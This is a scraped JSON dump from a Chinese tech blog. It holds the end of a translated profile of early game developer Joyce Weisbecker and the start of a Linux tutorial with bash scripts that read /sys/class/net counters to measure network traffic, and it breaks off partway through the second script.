或者运行一个缓慢的处理器——你能用它做很多事情。问题是你怎么在有限的东西上展现这个游戏？你有两个等级的、黑白的、32 比 32 窗口图标，那就是你整个屏幕。”</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmz31a7yq0j20fz0acwep.jpg\" width=\"575\" height=\"372\"></p>\n<p>这些限制解释了为什么在 <i>Speedway </i>里，Joyce 选择用两个白色方块代表赛车，其中一个中间有个黑点。她说：“人们批评说：’哦，是啊，这看起来根本不像个车。’你试试啊！你知道吗？你试试做一个能整个放进两个窗口图标里的游戏。”</p>\n<p>Joyce 的 <i>Tag </i>是一个更简装的东西。在这个双玩家游戏中，每个玩家控制屏幕上的一个简单的点。一个玩家是“it;”，他必须引导他们的点远离另一个玩家的点，这样他们就不会碰到。每次游戏都有两分钟长，得到最高分的人（每次接触得 10  分）赢得游戏。</p>\n<p><i></i><i>Tag </i>代表能用两个点在屏幕上玩的几乎最简单的电子游戏。巧合地是，一个相似的游戏是第一个 TV 基础上的电子游戏，由 Sanders Associates 的 Ralph Baer 和 Bill Harrison 在 1967 年创造（Baer 把它叫做“追逐游戏”）。</p>\n<p>RCA 在一个盒中发布了这两个游戏，这是 Weisbecker 自己做的选择。她回忆说：“在 <i>Speedway </i>上我还有多余的空间。<i>Tag </i>太简单了不能放在它自己单独的盒里。我想提高 RCA 想买我的赛车游戏的机会。”</p>\n<p>RCA 确实买了它，由一张 1976 年 11 月 28 日的发票证明。她说这两个游戏花了她 200 个小时来工作。她回忆说：“我十月份发送了代码并给他们开了账单。但显然，要么他们不喜欢它，要么我意识到我本来能让它更快。在十一月，我给他们发送了修改版本，那是他们发布的版本。”</p>\n<p>在考虑到这些游戏的历史意义时，必须记着 Studio II 的局限——以及这些早期游戏来自于一个刚刚高中毕业的人，那时只有极少美国人拥有电脑或者与电脑有交集。当然，那时她已经在世界上第一台家庭电脑上编程了好几年。世界很快会跟上步伐：1976年末，美国会卖出 40,000 台个人电脑。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmz31b06cwj20gf097ak1.jpg\" width=\"591\" height=\"331\"></p>\n<h2>发布失败</h2>\n<p>在市场上没能打败更有能力的 Fairchild Channel F，Studio II 在发布时就被淘汰了。Atari 后来在 1977 年发布了未来的控制台 VCS。</p>\n<p>除了低像素，Studio II 的主要缺点之一是它的内置 Touch Tone，像是键盘控制器，没有操控杆的选择。Joyce 为键盘给出了几个理由，包括降低制造价格来达到 150 美元价格点的诉求，以及 RCA （和 Joseph Weisbecker）打算在计划的替代物发布之前把 Studio II 作为权宜之计的事实。包括彩色 Studio III 游戏控制台，中间的 Studio IV 家庭个人电脑以及完全合格的 Studio V 电脑。Joyce 说：“当你有一个高分辨率的全色彩屏幕，是的，你才把操控杆放上去。那是为了后来的新版软件，与家庭电脑或者高级电子游戏系统搭配，如果你能走到那一步的话。”</p>\n<p>由于技术限制和有限的游戏库，Studio II 经营惨淡，RCA 在仅仅一年后撤下了该产品，也就是 1978 年二月。</p>\n<p>Joseph Weisbecker 发现自己受阻受挫，有着很多永不见天日的教育电脑产品计划。但是对 RCA 来说，这些消费电子产品永远是次要的考虑，Joyce 说：“RCA 管理层永远不想踏进电子游戏市场了。”他们仅仅想为他们的半导体找到市场。</p>\n<p>根据该目标判断，1802 CPU 取得了巨大的成功。虽然 RCA 在娱乐和家庭电脑产品上永远进行得不好，但是它在移动电话、心脏起搏器甚至太空探测器（比如 1989 年发射的 <i>Galileo</i>，探索木星和它的卫星）领域中找到了位置。芯片的一个版本今天仍然被制造，并为它的错误忍耐力和物理强度受到称赞。该芯片包含与 Joseph Weisbecker 在 1969 年为其家庭电脑设计相同的电脑架构。</p>\n<p>由于 Studio II 的短暂寿命，Joyce 与控制台的关系迅速结束。她说：“他们没有销售足够多的游戏，以至于从来没有回来向我要更多。”她从来没机会在零售店货架上看到她的第一个商业电子产品，但是她为自己做了一份拷贝。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fmz31bozg2j20gh097n2r.jpg\" width=\"593\" height=\"331\"></p>\n<h2>RCA 之后的生活</h2>\n<p>1977 年，Joyce 在还与 RCA 签有合同的情况下，为 VIP 包含的登记项目（叫做RCA Cosmac VIP Game Manual）的商业供给编写了三个游戏 <i>Slide</i>, <i>Sum Fun</i>, 和 <i>Sequence Shoot</i>。之后，她的合同过期了。到决定是否继续追求游戏开发的时候，她决定专心于学校，选择了稳定，而不是向迅速发展的早期家庭个人电脑游戏市场前进的不确定性。</p>\n<p>Joyce 说：“你看了看周围，说，’好吧，我真的想在家生活，每天晚上复制录音带，然后去邮局，复印指导手册，在回家把他们放进塑料 Ziploc 袋子里然后邮寄给人们吗？’那就是那时的电脑游戏行业。”</p>\n<p>Joyce 在里德大学继续她的大学生涯，直到她在 1980 年取得了电脑工程和精算双学位。她从事了精算师工作，部分受到她父亲的偶像 Edmund Berkeley 的鼓舞。Edmund Berkeley 正是做了同样的工作。在 1998 年，她回到学校取得了电子工程的本科学位和计算机科学的研究生学位，并作为雷达信号处理工程师工作了一段时间，设计数字滤波器。最近几年，她又对游戏开发起了兴趣。她解释说：“我试着准备做真正有趣的 AI 和电脑辅助动画。因为我意识到我想做有故事基础的合作游戏。”</p>\n<p>至于她的父亲， Joseph 继续在 RCA 工作到 1982 年，那时肺气肿使得他开车去工作变得危险。他坚持认为肺的损伤来自于常年在家里地下室的狭小空间里焊接东西时吸入的树脂烟雾。Joyce 回忆说：“那是他的 Radio Shack 通量。”他在退休时仍然是一个爱好者，还是电子游戏的献身者，尤其是 <i>The Legend of Zelda</i>。他在 1990 年去世。</p>\n<p>回望过去，Joyce Weisbecker 不是特别想作为第一位女性电子游戏开发者出名。对她来说，那仅仅是个巧合。她把自己看为可能是第一位“非主流”电子游戏开发者，因为她是一个独立的合同工，而不是 RCA 的雇员。</p>\n<p>但是，她淡化了她作为一个科技英雄的角色。在我第一次询问她的过去时，她马上被我对她的成就的注意力所震惊。她说：“你是第一个问我的工作的人。我只准备好谈我父亲的工作，而我只是个脚注。”</p>\n<p>好吧，我在这要说 Joyce Weisbecker 绝不是个脚注。对科技历史上的每一个 Steve Jobs 和 Bill Gates 来说，有像她一样被忘记的先驱。通过纪念她在上世纪 70 年代的成就，当家庭电子游戏市场几乎被忘记时，我们可以帮助未来的工程师和科学家的更包容的未来铺平道路。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113401\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113401votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113401\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/chenyahui\">精算狗</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/chenyahui\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/chenyahui\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/chenyahui/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/chenyahui/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 16</a> · <a title=\"QQ：564968845\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a> <a title=\"个人微信：564968845\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/34af66ec0a5fd8bfe9417796de5cea3f5953ab7c.jpg"}
{"url_object_id": "3d616518c51266775d612bb308e5855a", "title": "如何在 Linux 下统计高速网络中的流量", "url": "http://blog.jobbole.com/113226/", "create_date": "2017/12/09", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/12/93caf558382f0e23253d7b6a7cc1b012.jpeg"], "praise_nums": 1, "comment_nums": 0, "favor_nums": 0, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://xmodulo.com/measure-packets-per-second-throughput-high-speed-network-interface.html\">Dan Nanni</a>   译文出处：<a target=\"_blank\" href=\"\">彭秦进</a>   </div><p><a title=\"如何在Linux下统计高速网络中的流量\" href=\"https://dn-linuxcn.qbox.me/data/attachment/album/201401/20/111509bcnzyb75c7v8e1ch.jpeg\" target=\"_blank\" rel=\"lightbox[5558]\"><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/93caf558382f0e23253d7b6a7cc1b012.jpeg\" alt=\"nethogs2\" width=\"594\" height=\"354\"></a></p>\n<p>在Linux中有很多的流量监控工具，它们可以监控、分类网络流量，以花哨的图形用户界面提供实时流量分析报告。大多数这些工具（例如：<a href=\"http://xmodulo.com/2013/10/set-web-based-network-traffic-monitoring-linux.html\" target=\"_blank\" rel=\"external nofollow\">ntopng </a>, <a href=\"http://xmodulo.com/2013/10/set-web-based-network-traffic-monitoring-linux.html\" target=\"_blank\" rel=\"external nofollow\"> </a><a href=\"http://xmodulo.com/2012/06/how-to-install-iftop-on-linux.html\" target=\"_blank\" rel=\"external nofollow\">iftop </a>）都是基于<a href=\"http://www.tcpdump.org/pcap3_man.html\" target=\"_blank\" rel=\"external nofollow\">libpcap</a> 库的 ，这个函数库是用来截取流经网卡的数据包的，可在用户空间用来监视分析网络流量。尽管这些工具功能齐全，然而基于libpcap库的流量监控工具无法处理高速（Gb以上）的网络接口，原因是由于在用户空间做数据包截取的系统开销过高所致。</p>\n<p>在本文中我们介绍一种简单的Shell 脚本，它可以监控网络流量而且不依赖于缓慢的libpcap库。这些脚本支持Gb以上规模的高速网络接口，如果你对“汇聚型”的网络流量感兴趣的话，它们可统计每个网络接口上的流量。</p>\n<p>脚本主要是基于<a href=\"http://lwn.net/Articles/31185/\" target=\"_blank\" rel=\"external nofollow\">sysfs</a>虚拟文件系统，这是由内核用来将设备或驱动相关的信息输出到用户空间的一种机制。网络接口的相关分析数据会通过“/sys/class/net//statistics”输出。</p>\n<p>举个例子，eth0的网口上分析报告会输出到这些文件中：</p>\n<ul>\n<li><strong>/sys/class/net/eth0/statistics/rx_packets:</strong> 收到的数据包数据</li>\n<li><strong>/sys/class/net/eth0/statistics/tx_packets:</strong> 传输的数据包数量</li>\n<li><strong>/sys/class/net/eth0/statistics/rx_bytes:</strong> 接收的字节数</li>\n<li><strong>/sys/class/net/eth0/statistics/tx_bytes:</strong> 传输的字节数</li>\n<li><strong>/sys/class/net/eth0/statistics/rx_dropped:</strong> 当收到包数据包下降的数据量</li>\n<li><strong>/sys/class/net/eth0/statistics/tx_dropped:</strong> 传输包数据包下降的数据量</li>\n</ul>\n<p>这些数据会根据内核数据发生变更的时候自动刷新。因此，你可以编写一系列的脚本进行分析并计算流量统计。下面就是这样的脚本（感谢 <a href=\"https://gist.github.com/joemiller/4069513\" target=\"_blank\" rel=\"external nofollow\">joemiller</a> 提供）。第一个脚本是统计每秒数据量，包含接收（RX）或发送（TX）。而后面的则是一个描述网络传输中的接收（RX）发送(TX)带宽。这些脚本中安装不需要任何的工具。</p>\n<p>测量网口每秒数据包：</p>\n<div id=\"crayon-52dc688d925f7354156767\">\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635ac44c67c469900950\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#!/bin/bash\r\n\r\nINTERVAL=\"1\"  # update interval in seconds\r\n\r\nif [ -z \"$1\" ]; then\r\n        echo\r\n        echo usage: $0 [network-interface]\r\n        echo\r\n        echo e.g. $0 eth0\r\n        echo\r\n        echo shows packets-per-second\r\n        exit\r\nfi\r\n\r\nIF=$1\r\n\r\nwhile true\r\ndo\r\n        R1=`cat /sys/class/net/$1/statistics/rx_packets`\r\n        T1=`cat /sys/class/net/$1/statistics/tx_packets`\r\n        sleep $INTERVAL\r\n        R2=`cat /sys/class/net/$1/statistics/rx_packets`\r\n        T2=`cat /sys/class/net/$1/statistics/tx_packets`\r\n        TXPPS=`expr $T2 - $T1`\r\n        RXPPS=`expr $R2 - $R1`\r\n        echo \"TX $1: $TXPPS pkts/s RX $1: $RXPPS pkts/s\"\r\ndone</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c67c469900950-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c67c469900950-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c67c469900950-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c67c469900950-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c67c469900950-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c67c469900950-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c67c469900950-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c67c469900950-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c67c469900950-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c67c469900950-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c67c469900950-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c67c469900950-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c67c469900950-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c67c469900950-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c67c469900950-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c67c469900950-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c67c469900950-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c67c469900950-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c67c469900950-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c67c469900950-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c67c469900950-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c67c469900950-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c67c469900950-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c67c469900950-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c67c469900950-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c67c469900950-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c67c469900950-27\">27</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635ac44c67c469900950-1\"><span class=\"crayon-p\">#!/bin/bash</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c67c469900950-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a635ac44c67c469900950-3\"><span class=\"crayon-v\">INTERVAL</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"1\"</span><span class=\"crayon-h\">  </span><span class=\"crayon-p\"># update interval in seconds</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c67c469900950-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a635ac44c67c469900950-5\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">z</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"$1\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">then</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c67c469900950-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">echo</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac44c67c469900950-7\"><span class=\"crayon-e\">        </span><span class=\"crayon-e\">echo </span><span class=\"crayon-v\">usage</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">network</span><span class=\"crayon-o\">-</span><span class=\"crayon-t\">interface</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c67c469900950-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">echo</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac44c67c469900950-9\"><span class=\"crayon-e\">        </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">g</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">eth0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c67c469900950-10\"><span class=\"crayon-e\">        </span><span class=\"crayon-e\">echo</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac44c67c469900950-11\"><span class=\"crayon-e\">        </span><span class=\"crayon-e\">echo </span><span class=\"crayon-e\">shows </span><span class=\"crayon-v\">packets</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">per</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">second</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c67c469900950-12\"><span class=\"crayon-e\">        </span><span class=\"crayon-e\">exit</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac44c67c469900950-13\"><span class=\"crayon-e\">fi</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c67c469900950-14\"> </div><div class=\"crayon-line\" id=\"crayon-5a635ac44c67c469900950-15\"><span class=\"crayon-st\">IF</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c67c469900950-16\"> </div><div class=\"crayon-line\" id=\"crayon-5a635ac44c67c469900950-17\"><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c67c469900950-18\"><span class=\"crayon-st\">do</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac44c67c469900950-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">R1</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sys</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">net</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">statistics</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">rx_packets</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c67c469900950-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">T1</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sys</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">net</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">statistics</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tx_packets</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac44c67c469900950-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-i\">sleep</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-e\">INTERVAL</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c67c469900950-22\"><span class=\"crayon-e\">        </span><span class=\"crayon-v\">R2</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sys</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">net</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">statistics</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">rx_packets</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac44c67c469900950-23\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">T2</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sys</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">net</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">statistics</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tx_packets</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c67c469900950-24\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">TXPPS</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">`</span><span class=\"crayon-i\">expr</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">T2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">T1</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac44c67c469900950-25\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">RXPPS</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">`</span><span class=\"crayon-i\">expr</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">R2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">R1</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c67c469900950-26\"><span class=\"crayon-h\">        </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"TX $1: $TXPPS pkts/s RX $1: $RXPPS pkts/s\"</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac44c67c469900950-27\"><span class=\"crayon-v\">done</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0037 seconds] -->\r\n\n</div>\n</div>\n<p>网络带宽测量</p>\n<div id=\"crayon-52dc688d92610571820674\">\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635ac44c687356419825\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#!/bin/bash\r\n\r\nINTERVAL=\"1\"  # update interval in seconds\r\n\r\nif [ -z \"$1\" ]; then\r\n        echo\r\n        echo usage: $0 [network-interface]\r\n        echo\r\n        echo e.g. $0 eth0\r\n        echo\r\n        exit\r\nfi\r\n\r\nIF=$1\r\n\r\nwhile true\r\ndo\r\n        R1=`cat /sys/class/net/$1/statistics/rx_bytes`\r\n        T1=`cat /sys/class/net/$1/statistics/tx_bytes`\r\n        sleep $INTERVAL\r\n        R2=`cat /sys/class/net/$1/statistics/rx_bytes`\r\n        